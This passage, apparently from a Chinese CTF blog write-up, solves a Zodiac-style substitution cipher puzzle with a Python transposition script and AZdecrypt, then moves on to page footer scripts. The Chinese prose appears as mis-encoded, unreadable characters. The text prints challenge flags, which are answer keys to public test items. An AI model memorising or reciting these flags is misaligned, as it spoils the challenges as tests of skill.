main()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E6%8A%84%E9%94%99%E7%9A%84%E5%AD%97%E7%AC%A6/6YEQDS6CN0TBVR%28VC~666HM.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Aman_very_cool&#125;</span><br></pre></td></tr></table></figure><h3 id="é»„é“åäºŒå®«"><a class="header-anchor" href="#é»„é“åäºŒå®«">Â¶</a>é»„é“åäºŒå®«</h3><p>é¢˜ç›®æ¥æºäºæœ€è¿‘è¢«ç ´è§£çš„åäºŒå®«æ€æ‰‹å¯†ç ï¼Œä¹Ÿæ˜¯æœ€è¿‘iæ˜¥ç§‹å‡ºçš„åŸé¢˜ï¼Œåªæ˜¯é‡Œé¢ä¸€äº›å­—ç¬¦è¢«æ”¹åŠ¨äº†<br> æœ‰å…´è¶£çš„å¯ä»¥å»äº†è§£è¿™ä¸ªæ•…äº‹ï¼š<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sohu.com/a/437973880_610300">https://www.sohu.com/a/437973880_610300</a><br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/QBL%24HSS%24Q6VGB_%5BU31AVT7L.png" alt=""><br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/R5FG%249_4LUP%7D%5D~06VTT%29%24%7BH.png" alt=""><br> é¦–å…ˆæˆ‘ä»¬å…ˆæŠŠå›¾ç‰‡çš„å†…å®¹æŠ„ä¸‹æ¥<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%98.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%,,@*&gt;@?&#x3D;&#x3D;%88%5</span><br><span class="line">,@%#@@90-7$^&#x3D;*@</span><br><span class="line">17,(&gt;()1@##-$40</span><br><span class="line">~,*6?#%#8#&#x3D;75+1</span><br><span class="line">(*@*1%#&gt;,0@5)%?</span><br><span class="line">%*^&#x3D;)&amp;&gt;&#x3D;1%,+7&amp;#</span><br><span class="line">8681(+8*@@(,@@@</span><br><span class="line">#*&#x3D;#$3*#%,#%%,3</span><br><span class="line">,*+7,7+@&#x3D;&#x3D;&#x3D;+)61</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨è„šæœ¬è¿›è¡Œæ’åˆ—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s1=<span class="string">r&#x27;%,,@*&gt;@?==%88%5&#x27;</span>*<span class="number">9</span></span><br><span class="line">s2=<span class="string">r&#x27;,@%#@@90-7$^=*@&#x27;</span>*<span class="number">9</span></span><br><span class="line">s3=<span class="string">r&#x27;17,(&gt;()1@##-$40&#x27;</span>*<span class="number">9</span></span><br><span class="line">s4=<span class="string">r&#x27;~,*6?#%#8#=75+1&#x27;</span>*<span class="number">9</span></span><br><span class="line">s5=<span class="string">r&#x27;(*@*1%#&gt;,0@5)%?&#x27;</span>*<span class="number">9</span></span><br><span class="line">s6=<span class="string">r&#x27;%*^=)&amp;&gt;=1%,+7&amp;#&#x27;</span>*<span class="number">9</span></span><br><span class="line">s7=<span class="string">r&#x27;8681(+8*@@(,@@@&#x27;</span>*<span class="number">9</span></span><br><span class="line">s8=<span class="string">r&#x27;#*=#$3*#%,#%%,3&#x27;</span>*<span class="number">9</span></span><br><span class="line">s9=<span class="string">r&#x27;,*+7,7+@===+)61&#x27;</span>*<span class="number">9</span></span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    tmp += s1[i]+s2[i+<span class="number">2</span>]+s3[i+<span class="number">4</span>]+s4[i+<span class="number">6</span>]+s5[i+<span class="number">8</span>]+s6[i+<span class="number">10</span>]+s7[i+<span class="number">12</span>]+s8[i+<span class="number">14</span>]+s9[i+<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span>(<span class="params">obj, sec</span>):</span></span><br><span class="line">    str_list = [obj[i:i+sec] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(obj),sec)]</span><br><span class="line">    <span class="built_in">print</span>(str_list)</span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line">l1=cut(tmp,<span class="number">17</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">    <span class="built_in">print</span> (i)</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¾—åˆ°æ’åˆ—ç»“æœ<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/%25YO58T43%4034M%5D_24E72I%7BCF.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%%&gt;%,,@3*,#(#0+@#</span><br><span class="line">+,@)8@7@*7@@1#5&amp;8</span><br><span class="line">&#x3D;,*9@&#x3D;)#6#7&gt;0#7%%</span><br><span class="line">8$+@-#5?*13@?7-+(</span><br><span class="line">^(*&#x3D;&#x3D;$$1*&#x3D;+#&#x3D;&#x3D;^4~</span><br><span class="line">@)8%&#x3D;%&#x3D;0,*&amp;*,+8*1</span><br><span class="line">*1&gt;@#)8@76%&#x3D;@%6%,</span><br><span class="line">,?#1(%15@(#&gt;%,,,%</span><br><span class="line">%&gt;%,,@3*,#(#0+@#+</span><br></pre></td></tr></table></figure><p>å†æ”¾å…¥AZdecryptè½¯ä»¶ä¸­è¿è¡Œ<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/PL%29X0HOGMD%5D%5BAS94%7B_RLLWQ.png" alt=""><br> çœ‹åˆ°äº†flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;alphananke&#125;</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a class="header-anchor" href="#Reverse">Â¶</a>Reverse</h2></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…:</span> <span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">dota_st</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥:</span> <span class="post-copyright-info"><a href="https://www.wlhhlc.top/posts/49040/">https://www.wlhhlc.top/posts/49040/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜:</span> <span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://www.wlhhlc.top" target="_blank">dota_st</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/9YT534K~N47CEGE%5BCM9A%25C6.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer="defer"></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> æ‰“èµ<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/dota-st/blog_file/mm_facetoface_collect_qrcode_1601714082856.png" rel="external nofollow noreferrer" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/dota-st/blog_file/mm_facetoface_collect_qrcode_1601714082856.png" alt="å¾®ä¿¡"></a><div class="post-qr-code-desc">å¾®ä¿¡</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/dota-st/blog_file/1601714101044.jpg" rel="external nofollow noreferrer" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/dota-st/blog_file/1601714101044.jpg" alt="æ”¯ä»˜å®"></a><div class="post-qr-code-desc">æ”¯ä»˜å®</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/25127/"><img class="prev-cover" src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/205458-155593769824cb.jpg" onerror='onerror=null,src="/img/404.jpg"'><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">CtfShowèŒæ–°åŒºWP</div></div></a></div><div class="next-post pull-right"><a href="/posts/46463/"><img class="next-cover" src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/222.jpg" onerror='onerror=null,src="/img/404.jpg"'><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">æ¨¡æ‹Ÿç½‘ç«™æ”»å‡»åˆ°ææƒçš„å…¨éƒ¨è¿‡ç¨‹</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i> <span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/posts/20107/" title="2021ç¥¥äº‘æ¯WEB-WP"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/G%7D3K%5DE3_XQK%7B1_T5%24SW%5BF6N.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-24</div><div class="title">2021ç¥¥äº‘æ¯WEB-WP</div></div></a></div><div><a href="/posts/64939/" title="2021ç¬¬äº”ç©ºé—´å¤§èµ›WEB-WP"><img class="cover" src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%88%9D%E8%B5%9B/S%24%5B4BFQ%243%29%5BUKSSF0J%7B4%402P.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-17</div><div class="title">2021ç¬¬äº”ç©ºé—´å¤§èµ›WEB-WP</div></div></a></div><div><a href="/posts/59745/" title="2022é•¿å®‰æˆ˜ç–«ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›WP"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/1212355-20220112165242528-1728151902.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-19</div><div class="title">2022é•¿å®‰æˆ˜ç–«ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›WP</div></div></a></div><div><a href="/posts/25127/" title="CtfShowèŒæ–°åŒºWP"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/205458-155593769824cb.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-15</div><div class="title">CtfShowèŒæ–°åŒºWP</div></div></a></div><div><a href="/posts/55334/" title="bugkuå¹³å°webé¢˜ç›®ï¼ˆæ–°æ‰‹æ¨èï¼‰"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/bugku/%5D%28MZVF%7D3%40%25HTMN%29VS%60KMD74.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-17</div><div class="title">bugkuå¹³å°webé¢˜ç›®ï¼ˆæ–°æ‰‹æ¨èï¼‰</div></div></a></div><div><a href="/posts/33757/" title="ctfshow-Web1000é¢˜ç³»åˆ—ä¿®ç‚¼(äºŒ)"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/bbc58c3d998d4f389fdae649334873f7.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-26</div><div class="title">ctfshow-Web1000é¢˜ç³»åˆ—ä¿®ç‚¼(äºŒ)</div></div></a></div></div></div></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022<i id="heartbeat" class="fa fas fa-heartbeat"></i> dota_st</div><div class="framework-info"><span>dota_st</span> <span class="footer-separator">|</span><span>åšå®¢</span></div><div class="icp"><a target="_blank" rel="noopener external nofollow noreferrer" href="http://beian.miit.gov.cn"><img class="icp-icon" src="/img/icp.png"><span>ç¼ICPå¤‡2020003865å·</span></a></div><html></html><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head><body><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,10,4,9,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="å°ç ´ç«™å·²åœ¨å„ç§ç¾éš¾ä¸­è‹Ÿæ´»"+m+" å¹´ "+T+" å¤© "+f+" å°æ—¶ "+h+" åˆ†é’Ÿ "+u+" ç§’"}siteTime()</script></body></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>ç”±</span> <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/wzpan/hexo-generator-search" style="color:#49b1f5">hexo-generator-search</a> <span>æä¾›æ”¯æŒ</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="https://cdn.jsdelivr.net/gh/dota-st/blog_file/background.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config_change',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()
  window.foot_tm()
  
  $('script[data-pjax]').each(function () {
    $(this).parent().append($(this).remove())
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  if (typeof gtag === 'function') {
    gtag('config', '', {'page_path': window.location.pathname});
  }

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // Analytics
  if (false) {
    MtaH5.pgv()
  }

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})


document.addEventListener('pjax:send', function () {
  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  $(window).off('scroll')

  //reset readmode
  $('body').hasClass('read-mode') && $('body').removeClass('read-mode')

})</script></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{scale:1,hHeadPos:.5,vHeadPos:.618,jsonPath:"/live2dw/assets/haruto.model.json"},display:{superSample:2,position:"right",width:150,height:300,hOffset:20,vOffset:-90},mobile:{show:!0,scale:1},react:{opacityDefault:.3,opacityOnHover:.3,opacity:.95},log:!1})</script></body></html>